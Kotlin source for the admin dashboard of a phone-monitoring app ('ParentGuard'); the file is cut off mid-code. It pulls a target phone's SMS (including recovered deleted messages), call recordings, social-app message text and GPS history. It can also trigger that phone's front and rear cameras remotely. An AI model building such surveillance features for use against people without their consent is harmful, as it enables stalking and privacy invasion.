package com.parentguard.monitor.ui

import android.content.ContentValues
import android.content.Context
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Scaffold
import androidx.compose.material3.ScrollableTabRow
import androidx.compose.material3.Tab
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import com.parentguard.core.network.FirebaseRealtimeRelayClient
import com.parentguard.core.network.FirebaseRelayConfig
import com.parentguard.core.protocol.RemoteParentCommand
import com.parentguard.core.protocol.TelecomEventType
import com.parentguard.core.protocol.TelemetryPayload
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Base64
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MonitorMainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme {
                ParentMonitorDashboardScreen()
            }
        }
    }
}

/**
 * Helper to save individual Base64 JPEG photos or full daily ZIP archives into the Admin phone's
 * public Downloads/ParentGuard folder using MediaStore (Android 10+ scoped-storage safe).
 */
object AdminMediaDownloadHelper {

    private val prettyJson = Json { prettyPrint = true; encodeDefaults = true }

    fun saveFileToDownloads(
        context: Context,
        fileName: String,
        mimeType: String,
        bytes: ByteArray
    ): String {
        return runCatching {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE, mimeType)
                    put(MediaStore.Downloads.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS + "/ParentGuard")
                }
                val uri = context.contentResolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values)
                    ?: throw IllegalStateException("Failed to create MediaStore entry")
                context.contentResolver.openOutputStream(uri)?.use { out ->
                    out.write(bytes)
                }
                "Downloads/ParentGuard/$fileName"
            } else {
                @Suppress("DEPRECATION")
                val dir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "ParentGuard")
                dir.mkdirs()
                val outFile = File(dir, fileName)
                FileOutputStream(outFile).use { it.write(bytes) }
                outFile.absolutePath
            }
        }.getOrElse { e ->
            // Fallback to app external files dir if MediaStore fails
            val fallbackDir = File(context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "ParentGuard")
            fallbackDir.mkdirs()
            val outFile = File(fallbackDir, fileName)
            FileOutputStream(outFile).use { it.write(bytes) }
            outFile.absolutePath + " (${e.message})"
        }
    }

    fun savePhotoBase64ToDownloads(context: Context, fileName: String, base64Jpeg: String): String {
        val cleanName = if (fileName.endsWith(".jpg", true)) fileName else "$fileName.jpg"
        val bytes = Base64.getDecoder().decode(base64Jpeg)
        return saveFileToDownloads(context, cleanName, "image/jpeg", bytes)
    }

    fun exportFullDayActivityZip(context: Context, payload: TelemetryPayload): String {
        val dateStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val zipFileName = "ParentGuard_Daily_Activity_$dateStamp.zip"
        val baos = ByteArrayOutputStream()

        ZipOutputStream(baos).use { zos ->
            // 1. Add Human-Readable Full Day Activity Report
            val reportText = buildHumanReadableReport(payload)
            zos.putNextEntry(ZipEntry("Daily_Activity_Report.txt"))
            zos.write(reportText.toByteArray(Charsets.UTF_8))
            zos.closeEntry()

            // 2. Add Raw Telemetry JSON
            val rawJson = prettyJson.encodeToString(payload)
            zos.putNextEntry(ZipEntry("telemetry_raw.json"))
            zos.write(rawJson.toByteArray(Charsets.UTF_8))
            zos.closeEntry()

            // 3. Add All Captured Front/Back Camera Photos
            payload.cameraCheckInSnapshots.forEachIndexed { idx, snap ->
                runCatching {
                    val bytes = Base64.getDecoder().decode(snap.jpegBase64)
                    val entryName = "camera_captures/${idx + 1}_${snap.lensFacing.name}_${snap.captureId}.jpg"
                    zos.putNextEntry(ZipEntry(entryName))
                    zos.write(bytes)
                    zos.closeEntry()
                }
            }

            // 4. Add All Storage / Gallery Camera Pictures
            payload.storageSummary?.lastFiveCameraPictures?.forEachIndexed { idx, photo ->
                val b64 = photo.thumbnailJpegBase64
                if (!b64.isNullOrEmpty()) {
                    runCatching {
                        val bytes = Base64.getDecoder().decode(b64)
                        val entryName = "storage_photos/${idx + 1}_${photo.fileName}"
                        zos.putNextEntry(ZipEntry(entryName))
                        zos.write(bytes)
                        zos.closeEntry()
                    }
                }
            }
        }

        return saveFileToDownloads(context, zipFileName, "application/zip", baos.toByteArray())
    }

    private fun buildHumanReadableReport(p: TelemetryPayload): String = buildString {
        val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        appendLine("================================================================")
        appendLine(" PARENTGUARD ADMIN — FULL DAY ACTIVITY & MEDIA REPORT")
        appendLine(" Generated: ${fmt.format(Date(p.generatedAtUtcMs))}")
        appendLine("================================================================")
        appendLine()

        p.deviceStatus?.let { ds ->
            appendLine("[1. DEVICE STATUS & BATTERY]")
            appendLine("  Battery: ${ds.batteryPercentage}% (Charging: ${ds.isCharging}, Plug: ${ds.chargePlugType})")
            appendLine("  Network: ${ds.networkTransport} | Auto-Sync Interval: ${ds.autoSyncIntervalMinutes} mins")
            appendLine()
        }

        appendLine("[2. REAL-TIME LOCATION HISTORY & GEOFENCE (${p.locationHistory.size} points)]")
        p.locationHistory.forEach { loc ->
            appendLine("  - [${fmt.format(Date(loc.timestampUtcMs))}] ${loc.streetAddress}")
            appendLine("    Coords: (${loc.latitude}, ${loc.longitude}) | Geofence: ${loc.geofenceStatus}")
        }
        appendLine()

        val events = p.telecomSummary?.events.orEmpty()
        appendLine("[3. CALL LOGS & SMS MESSAGES (${events.size} records)]")
        events.forEach { e ->
            val name = e.contactName?.let { " ($it)" } ?: ""
            val del = if (e.isDeletedFromHandset) " [DELETED ON HANDSET - RECOVERED]" else ""
            val audio = e.callRecordingFileName?.let { " | Call Audio: $it" } ?: ""
            if (!e.smsBodyText.isNullOrEmpty()) {
                appendLine("  - [${fmt.format(Date(e.timestampUtcMs))}] ${e.eventType}$del: ${e.phoneNumber}$name -> \"${e.smsBodyText}\"")
            } else {
                appendLine("  - [${fmt.format(Date(e.timestampUtcMs))}] ${e.eventType}: ${e.phoneNumber}$name (Duration: ${e.durationSeconds}s)$audio")
            }
        }
        appendLine()

        appendLine("[4. SOCIAL MEDIA & APP NOTIFICATIONS (${p.whatsAppActivityLog.size} records)]")
        p.whatsAppActivityLog.forEach { w ->
            appendLine("  - [${fmt.format(Date(w.timestampUtcMs))}] [${w.appName}] ${w.senderOrContactTitle}: \"${w.messageOrCallDetail}\"")
        }
        appendLine()

        appendLine("[5. DAILY APP & BROWSER USAGE]")
        p.appUsageSummary?.aggregatedApps?.forEach { app ->
            appendLine("  - ${app.appLabel} (${app.packageName}): ${app.totalForegroundSeconds / 60} mins")
        }
    }
}

@Composable
fun ParentMonitorDashboardScreen() {
    val context = LocalContext.current
    val prefs = remember { context.getSharedPreferences("pg_monitor_prefs", Context.MODE_PRIVATE) }
    val scope = rememberCoroutineScope()

    var firebaseDbUrl by remember {
        val saved = prefs.getString("firebase_db_url", null)
        val initial = if (saved.isNullOrBlank() || saved.contains("REPLACE-WITH-YOUR-PROJECT")) {
            FirebaseRelayConfig.DEFAULT_FIREBASE_DB_URL
        } else {
            saved
        }
        mutableStateOf(initial)
    }
    var familyId by remember {
        mutableStateOf(prefs.getString("family_id", FirebaseRelayConfig.DEFAULT_FAMILY_ID) ?: FirebaseRelayConfig.DEFAULT_FAMILY_ID)
    }
    val authSecret = FirebaseRelayConfig.DEFAULT_FIREBASE_AUTH_SECRET

    var selectedTab by remember { mutableIntStateOf(0) }
    var statusBanner by remember { mutableStateOf("Connecting to Firebase Realtime Database...") }
    var downloadStatusNote by remember { mutableStateOf("") }
    var latestPayload by remember { mutableStateOf<TelemetryPayload?>(null) }

    suspend fun refreshFromFirebase() {
        if (!FirebaseRealtimeRelayClient.isConfigured(firebaseDbUrl)) {
            statusBanner = "Paste your Firebase Realtime DB URL in Settings."
            return
        }
        val res = withContext(Dispatchers.IO) {
            FirebaseRealtimeRelayClient.fetchLatestTelemetryPayload(firebaseDbUrl, authSecret, familyId)
        }
        if (res.isSuccess) {
            val payload = res.getOrNull()
            if (payload != null) {
                latestPayload = payload
                val timeStr = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date(payload.generatedAtUtcMs))
                statusBanner = "● Live ($timeStr) • 5m Auto-Sync Active • ${payload.revocationReasonNote ?: "Online"}"
            } else {
                statusBanner = "Connected ($familyId) • Waiting for Agent first sync..."
            }
        } else {
            statusBanner = "Firebase Error: ${res.exceptionOrNull()?.message}"
        }
    }

    fun sendParentCommand(
        action: String,
        label: String,
        geofenceLat: Double? = null,
        geofenceLng: Double? = null,
        geofenceRadius: Float? = null
    ) {
        scope.launch {
            statusBanner = "Sending '$label' command to Agent..."
            val cmd = RemoteParentCommand(
                commandId = "cmd_" + UUID.randomUUID().toString().take(8),
                action = action,
                requestedAtUtcMs = System.currentTimeMillis(),
                geofenceLat = geofenceLat,
                geofenceLng = geofenceLng,
                geofenceRadiusMeters = geofenceRadius
            )
            val res = withContext(Dispatchers.IO) {
                FirebaseRealtimeRelayClient.sendRemoteCommand(firebaseDbUrl, authSecret, familyId, cmd)
            }
            if (res.isSuccess) {
                statusBanner = "Command '$label' sent! Waiting ~4–6s for Agent response..."
            } else {
                statusBanner = "Failed: ${res.exceptionOrNull()?.message}"
            }
        }
    }

    LaunchedEffect(firebaseDbUrl, familyId) {
        while (isActive) {
            if (FirebaseRealtimeRelayClient.isConfigured(firebaseDbUrl)) {
                refreshFromFirebase()
            }
            delay(3500L)
        }
    }

    val p = latestPayload
    val snaps = p?.cameraCheckInSnapshots.orEmpty()
    val galleryPhotos = p?.storageSummary?.lastFiveCameraPictures.orEmpty()
    val locations = p?.locationHistory.orEmpty()
    val socialLogs = p?.whatsAppActivityLog.orEmpty()
    val allTelecom = p?.telecomSummary?.events.orEmpty()
    val smsList = allTelecom.filter { it.eventType == TelecomEventType.SMS_INCOMING || it.eventType == TelecomEventType.SMS_OUTGOING }
    val callList = allTelecom.filter { it.eventType != TelecomEventType.SMS_INCOMING && it.eventType != TelecomEventType.SMS_OUTGOING }

    Scaffold { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
        ) {
            // Top Admin Header & Quick Remote Bar
            Column(modifier = Modifier.padding(horizontal = 16.dp, vertical = 10.dp)) {
                Text(
                    text = "ParentGuard • Admin Control Center",
                    style = MaterialTheme.typography.headlineSmall,
                    fontWeight = FontWeight.Bold
                )
                Text(
                    text = statusBanner,
                    style = MaterialTheme.typography.bodySmall
                )
                if (downloadStatusNote.isNotEmpty()) {
                    Text(
                        text = "✅ Saved: $downloadStatusNote",
                        style = MaterialTheme.typography.bodySmall,
                        fontWeight = FontWeight.SemiBold
                    )
                }
                Spacer(modifier = Modifier.height(8.dp))

                // Remote Action Row: Front Cam, Rear Cam, Sync Now, Full Day ZIP Download
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    Button(
                        onClick = { sendParentCommand("CAPTURE_FRONT", "Front Camera") },
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("Front Cam")
                    }
                    Button(
                        onClick = { sendParentCommand("CAPTURE_BACK", "Rear Camera") },
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("Rear Cam")
                    }
                    OutlinedButton(
                        onClick = { sendParentCommand("SYNC_ALL", "Instant Sync") },
                        modifier = Modifier.weight(1f)
                    ) {
                        Text("Sync")
                    }
                }
            }

            // 5-Tab Navigation Bar
            val tabTitles = listOf(
                "Overview & Export",
                "Media (${snaps.size + galleryPhotos.size})",
                "Location (${locations.size})",
                "Social (${socialLogs.size})",
                "Calls & SMS (${allTelecom.size})"
            )
            ScrollableTabRow(selectedTabIndex = selectedTab, edgePadding = 12.dp) {
                tabTitles.forEachIndexed { index, title ->
                    Tab(
                        selected = selectedTab == index,
                        onClick = { selectedTab = index },
                        text = { Text(title) }
                    )
                }
            }

            LazyColumn(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                when (selectedTab) {
                    0 -> {
                        // TAB 0: OVERVIEW, TOTAL DOWNLOAD & FIREBASE SETTINGS
                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(
                                        text = "Total Activity & Media Export",
                                        fontWeight = FontWeight.Bold
                                    )
                                    Text(
                                        text = "Download the entire day's activity report (Calls, SMS, Social chats, Location history, App usage) bundled with all captured camera & gallery photos as a single ZIP file, or batch-download all photos:",
                                        style = MaterialTheme.typography.bodySmall
                                    )
                                    Spacer(modifier = Modifier.height(8.dp))
                                    Button(
                                        onClick = {
                                            val cur = latestPayload
                                            if (cur == null) {
                                                Toast.makeText(context, "Wait for Child phone data to sync first.", Toast.LENGTH_SHORT).show()
                                            } else {
                                                scope.launch {
                                                    val path = withContext(Dispatchers.IO) {
                                                        AdminMediaDownloadHelper.exportFullDayActivityZip(context, cur)
                                                    }
                                                    downloadStatusNote = path
                                                    Toast.makeText(context, "Saved ZIP to $path", Toast.LENGTH_LONG).show()
                                                }
                                            }
                                        },
                                        modifier = Modifier.fillMaxWidth()
                                    ) {
                                        Text("⬇ Download Full Day Activity + All Media (.ZIP)")
                                    }
                                    Spacer(modifier = Modifier.height(6.dp))
                                    OutlinedButton(
                                        onClick = {
                                            val cur = latestPayload
                                            if (cur == null) {
                                                Toast.makeText(context, "No media synced yet.", Toast.LENGTH_SHORT).show()
                                            } else {
                                                scope.launch {
                                                    var savedCount = 0
                                                    withContext(Dispatchers.IO) {
                                                        cur.cameraCheckInSnapshots.forEach { s ->
                                                            if (s.jpegBase64.isNotEmpty()) {
                                                                AdminMediaDownloadHelper.savePhotoBase64ToDownloads(
                                                                    context,
                                                                    "Cam_${s.lensFacing.name}_${s.captureId}.jpg",
                                                                    s.jpegBase64
                                                                )
                                                                savedCount++
                                                            }
                                                        }
                                                        cur.storageSummary?.lastFiveCameraPictures?.forEach { g ->
                                                            if (!g.thumbnailJpegBase64.isNullOrEmpty()) {
                                                                AdminMediaDownloadHelper.savePhotoBase64ToDownloads(
                                                                    context,
                                                                    "Gallery_${g.fileName}",
                                                                    g.thumbnailJpegBase64
                                                                )
                                                                savedCount++
                                                            }
                                                        }
                                                    }
                                                    downloadStatusNote = "Downloaded $savedCount photos to Downloads/ParentGuard/"
                                                    Toast.makeText(context, downloadStatusNote, Toast.LENGTH_LONG).show()
                                                }
                                            }
                                        },
                                        modifier = Modifier.fillMaxWidth()
                                    ) {
                                        Text("⬇ Download All Photos to Gallery/Downloads (${snaps.size + galleryPhotos.size})")
                                    }
                                }
                            }
                        }

                        // Summary Scorecard
                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(text = "Live Target Device Summary", fontWeight = FontWeight.Bold)
                                    Spacer(modifier = Modifier.height(6.dp))
                                    val ds = p?.deviceStatus
                                    Text(
                                        text = "• Battery: ${ds?.batteryPercentage ?: "--"}% (${if (ds?.isCharging == true) ds.chargePlugType.name else "Unplugged"}) • Network: ${ds?.networkTransport?.name ?: "--"}\n" +
                                            "• Auto-Sync: Every ${ds?.autoSyncIntervalMinutes ?: 5} minutes\n" +
                                            "• Latest Location: ${locations.firstOrNull()?.streetAddress ?: "Waiting for GPS..."}\n" +
                                            "• Geofence Status: ${locations.firstOrNull()?.geofenceStatus ?: "Active"}\n" +
                                            "• Captured Camera Photos: ${snaps.size} | Gallery Photos: ${galleryPhotos.size}\n" +
                                            "• Social Media Logs: ${socialLogs.size} | SMS: ${smsList.size} | Calls: ${callList.size}",
                                        style = MaterialTheme.typography.bodySmall
                                    )
                                }
                            }
                        }

                        // App & Browser Usage Card
                        item {
                            val apps = p?.appUsageSummary?.aggregatedApps.orEmpty()
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(text = "Daily App & Browser Usage (${apps.size} apps)", fontWeight = FontWeight.Bold)
                                    Spacer(modifier = Modifier.height(6.dp))
                                    if (apps.isEmpty()) {
                                        Text(
                                            text = "Enable '3. Usage & Browser' on Agent phone to view screen time & browser sessions.",
                                            style = MaterialTheme.typography.bodySmall
                                        )
                                    } else {
                                        apps.take(15).forEach { app ->
                                            Text(
                                                text = "• ${app.appLabel} (${app.categoryName}): ${app.totalForegroundSeconds / 60} mins",
                                                style = MaterialTheme.typography.bodySmall
                                            )
                                        }
                                    }
                                }
                            }
                        }

                        // Firebase Connection Settings
                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(12.dp)) {
                                    Text(text = "Firebase Realtime Database Settings", fontWeight = FontWeight.Bold)
                                    Spacer(modifier = Modifier.height(6.dp))
                                    OutlinedTextField(
                                        value = firebaseDbUrl,
                                        onValueChange = {
                                            firebaseDbUrl = it
                                            prefs.edit().putString("firebase_db_url", it.trim()).apply()
                                        },
                                        label = { Text("Firebase DB URL") },
                                        modifier = Modifier.fillMaxWidth(),
                                        singleLine = true
                                    )
                                    Spacer(modifier = Modifier.height(6.dp))
                                    OutlinedTextField(
                                        value = familyId,
                                        onValueChange = {
                                            familyId = it
                                            prefs.edit().putString("family_id", it.trim()).apply()
                                        },
                                        label = { Text("Family Pairing ID") },
                                        modifier = Modifier.fillMaxWidth(),
                                        singleLine = true
                                    )
                                }
                            }
                        }
                    }

                    1 -> {
                        // TAB 1: CAMERA SNAPSHOTS & GALLERY MEDIA WITH INDIVIDUAL DOWNLOAD BUTTONS
                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(
                                        text = "Remote Front / Rear Camera Captures (${snaps.size})",
                                        fontWeight = FontWeight.Bold
                                    )
                                    Spacer(modifier = Modifier.height(6.dp))
                                    if (snaps.isEmpty()) {
                                        Text(
                                            text = "No remote camera snapshots yet. Tap 'Front Cam' or 'Rear Cam' at the top.",
                                            style = MaterialTheme.typography.bodySmall
                                        )
                                    } else {
                                        snaps.forEach { snap ->
                                            val timeStr = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date(snap.capturedAtUtcMs))
                                            val bmp = remember(snap.captureId) {
                                                runCatching {
                                                    val bytes = Base64.getDecoder().decode(snap.jpegBase64)
                                                    BitmapFactory.decodeByteArray(bytes, 0, bytes.size)?.asImageBitmap()
                                                }.getOrNull()
                                            }
                                            Column(
                                                modifier = Modifier
                                                    .fillMaxWidth()
                                                    .padding(vertical = 8.dp)
                                            ) {
                                                Row(
                                                    modifier = Modifier.fillMaxWidth(),
                                                    horizontalArrangement = Arrangement.SpaceBetween,
                                                    verticalAlignment = Alignment.CenterVertically
                                                ) {
                                                    Text(
                                                        text = "📷 ${snap.lensFacing.name} Lens • $timeStr",
                                                        fontWeight = FontWeight.SemiBold,
                                                        style = MaterialTheme.typography.bodySmall
                                                    )
                                                    OutlinedButton(
                                                        onClick = {
                                                            scope.launch {
                                                                val savedPath = withContext(Dispatchers.IO) {
                                                                    AdminMediaDownloadHelper.savePhotoBase64ToDownloads(
                                                                        context,
                                                                        "ParentGuard_${snap.lensFacing.name}_${snap.captureId}.jpg",
                                                                        snap.jpegBase64
                                                                    )
                                                                }
                                                                downloadStatusNote = savedPath
                                                                Toast.makeText(context, "Saved to $savedPath", Toast.LENGTH_SHORT).show()
                                                            }
                                                        }
                                                    ) {
                                                        Text("⬇ Download JPG")
                                                    }
                                                }
                                                if (bmp != null) {
                                                    Spacer(modifier = Modifier.height(4.dp))
                                                    Image(
                                                        bitmap = bmp,
                                                        contentDescription = snap.lensFacing.name,
                                                        modifier = Modifier
                                                            .fillMaxWidth()
                                                            .height(220.dp),
                                                        contentScale = ContentScale.Fit
                                                    )
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(
                                        text = "Last 5 Camera Pictures from Target Storage (${galleryPhotos.size})",
                                        fontWeight = FontWeight.Bold
                                    )
                                    Spacer(modifier = Modifier.height(6.dp))
                                    if (galleryPhotos.isEmpty()) {
                                        Text(
                                            text = "No storage photos synced yet.",
                                            style = MaterialTheme.typography.bodySmall
                                        )
                                    } else {
                                        galleryPhotos.forEachIndexed { idx, photo ->
                                            val bmp = remember(photo.fileName, photo.dateTakenUtcMs) {
                                                runCatching {
                                                    val b64 = photo.thumbnailJpegBase64 ?: return@runCatching null
                                                    val bytes = Base64.getDecoder().decode(b64)
                                                    BitmapFactory.decodeByteArray(bytes, 0, bytes.size)?.asImageBitmap()
                                                }.getOrNull()
                                            }
                                            Column(
                                                modifier = Modifier
                                                    .fillMaxWidth()
                                                    .padding(vertical = 8.dp)
                                            ) {
                                                Row(
                                                    modifier = Modifier.fillMaxWidth(),
                                                    horizontalArrangement = Arrangement.SpaceBetween,
                                                    verticalAlignment = Alignment.CenterVertically
                                                ) {
                                                    Column(modifier = Modifier.weight(1f)) {
                                                        Text(
                                                            text = "#${idx + 1} ${photo.fileName}",
                                                            fontWeight = FontWeight.SemiBold,
                                                            style = MaterialTheme.typography.bodySmall
                                                        )
                                                        Text(
                                                            text = "${photo.relativePath} • ${photo.sizeBytes / 1024} KB (${photo.widthPx}x${photo.heightPx})",
                                                            style = MaterialTheme.typography.bodySmall
                                                        )
                                                    }
                                                    if (!photo.thumbnailJpegBase64.isNullOrEmpty()) {
                                                        OutlinedButton(
                                                            onClick = {
                                                                scope.launch {
                                                                    val savedPath = withContext(Dispatchers.IO) {
                                                                        AdminMediaDownloadHelper.savePhotoBase64ToDownloads(
                                                                            context,
                                                                            "ParentGuard_${photo.fileName}",
                                                                            photo.thumbnailJpegBase64
                                                                        )
                                                                    }
                                                                    downloadStatusNote = savedPath
                                                                    Toast.makeText(context, "Saved to $savedPath", Toast.LENGTH_SHORT).show()
                                                                }
                                                            }
                                                        ) {
                                                            Text("⬇ Download")
                                                        }
                                                    }
                                                }
                                                if (bmp != null) {
                                                    Spacer(modifier = Modifier.height(6.dp))
                                                    Image(
                                                        bitmap = bmp,
                                                        contentDescription = photo.fileName,
                                                        modifier = Modifier
                                                            .fillMaxWidth()
                                                            .height(180.dp),
                                                        contentScale = ContentScale.Fit
                                                    )
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }

                    2 -> {
                        // TAB 2: REAL-TIME LOCATION & GEOFENCE
                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(
                                        text = "Geofence & Live GPS Location",
                                        fontWeight = FontWeight.Bold
                                    )
                                    Spacer(modifier = Modifier.height(6.dp))
                                    val latestLoc = locations.firstOrNull()
                                    if (latestLoc == null) {
                                        Text(
                                            text = "No GPS fix synced yet. Ensure Location permission is granted on Agent phone.",
                                            style = MaterialTheme.typography.bodySmall
                                        )
                                    } else {
                                        val t = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date(latestLoc.timestampUtcMs))
                                        Text(
                                            text = "📍 Current Street Address ($t):\n${latestLoc.streetAddress}\n\n" +
                                                "Coordinates: ${latestLoc.latitude}, ${latestLoc.longitude} (Accuracy: ±${latestLoc.accuracyMeters.toInt()}m)\n" +
                                                "Geofence Status: ${latestLoc.geofenceStatus}",
                                            style = MaterialTheme.typography.bodySmall
                                        )
                                        Spacer(modifier = Modifier.height(8.dp))
                                        Button(
                                            onClick = {
                                                sendParentCommand(
                                                    action = "SET_GEOFENCE",
                                                    label = "Set 500m Home Geofence",
                                                    geofenceLat = latestLoc.latitude,
                                                    geofenceLng = latestLoc.longitude,
                                                    geofenceRadius = 500f
                                                )
                                            },
                                            modifier = Modifier.fillMaxWidth()
                                        ) {
                                            Text("Set Current Location as 500m Safe Geofence")
                                        }
                                    }
                                }
                            }
                        }

                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(
                                        text = "Location History Log (${locations.size} points)",
                                        fontWeight = FontWeight.Bold
                                    )
                                    Spacer(modifier = Modifier.height(6.dp))
                                    locations.forEach { loc ->
                                        val t = SimpleDateFormat("MM-dd HH:mm:ss", Locale.getDefault()).format(Date(loc.timestampUtcMs))
                                        Text(
                                            text = "• [$t] ${loc.streetAddress}\n   (${loc.latitude}, ${loc.longitude}) • ${loc.geofenceStatus}",
                                            style = MaterialTheme.typography.bodySmall,
                                            modifier = Modifier.padding(vertical = 4.dp)
                                        )
                                    }
                                }
                            }
                        }
                    }

                    3 -> {
                        // TAB 3: SOCIAL MEDIA (WHATSAPP, IG, FB, SNAPCHAT, LINE) & BROWSER
                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(
                                        text = "Social Media Chats, Calls & Browser Activity (${socialLogs.size})",
                                        fontWeight = FontWeight.Bold
                                    )
                                    Text(
                                        text = "Monitors WhatsApp, Instagram, Facebook, Messenger, Snapchat, LINE, Telegram & Browser notifications:",
                                        style = MaterialTheme.typography.bodySmall
                                    )
                                    Spacer(modifier = Modifier.height(8.dp))
                                    if (socialLogs.isEmpty()) {
                                        Text(
                                            text = "No social media notifications captured yet. Enable '2. Social & Notifs' on the Agent phone.",
                                            style = MaterialTheme.typography.bodySmall
                                        )
                                    } else {
                                        socialLogs.forEach { w ->
                                            val t = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(Date(w.timestampUtcMs))
                                            val groupTag = if (w.isGroupConversation) " [Group]" else ""
                                            Text(
                                                text = "💬 [$t] [${w.appName}$groupTag] ${w.senderOrContactTitle}:\n   \"${w.messageOrCallDetail}\"",
                                                style = MaterialTheme.typography.bodySmall,
                                                modifier = Modifier.padding(vertical = 4.dp)
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }

                    4 -> {
                        // TAB 4: CALL LOGS (WITH CALL AUDIO FILES) & SMS (INCLUDING DELETED SMS)
                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(
                                        text = "SMS Messages — Sent, Received & Deleted (${smsList.size})",
                                        fontWeight = FontWeight.Bold
                                    )
                                    Spacer(modifier = Modifier.height(6.dp))
                                    if (smsList.isEmpty()) {
                                        Text(
                                            text = "No SMS messages synced yet.",
                                            style = MaterialTheme.typography.bodySmall
                                        )
                                    } else {
                                        smsList.forEach { e ->
                                            val t = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(Date(e.timestampUtcMs))
                                            val namePart = e.contactName?.let { " ($it)" } ?: ""
                                            val deletedBadge = if (e.isDeletedFromHandset) " ⚠️ [DELETED ON HANDSET - RECOVERED]" else ""
                                            Text(
                                                text = "✉️ [$t] ${e.eventType.name}$deletedBadge\n   Number: ${e.phoneNumber}$namePart\n   Text: \"${e.smsBodyText ?: ""}\"",
                                                style = MaterialTheme.typography.bodySmall,
                                                modifier = Modifier.padding(vertical = 4.dp)
                                            )
                                        }
                                    }
                                }
                            }
                        }

                        item {
                            Card(modifier = Modifier.fillMaxWidth()) {
                                Column(modifier = Modifier.padding(14.dp)) {
                                    Text(
                                        text = "Call Logs & Matched Call Recordings (${callList.size})",
                                        fontWeight = FontWeight.Bold
                                    )
                                    Spacer(modifier = Modifier.height(6.dp))
                                    if (callList.isEmpty()) {
                                        Text(
                                            text = "No Call History synced yet.",
                                            style = MaterialTheme.typography.bodySmall
                                        )
                                    } else {
                                        callList.forEach { e ->
                                            val t = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(Date(e.timestampUtcMs))
                                            val namePart = e.contactName?.let { " ($it)" } ?: ""
                                            val recPart = e.callRecordingFileName?.let { "\n   🎙️ Recording File: $it" } ?: ""
                                            Text(
                                                text = "📞 [$t] ${e.eventType.name}: ${e.phoneNumber}$namePart • Duration: ${e.durationSeconds}s$recPart",
                                                style = MaterialTheme.typography.bodySmall,
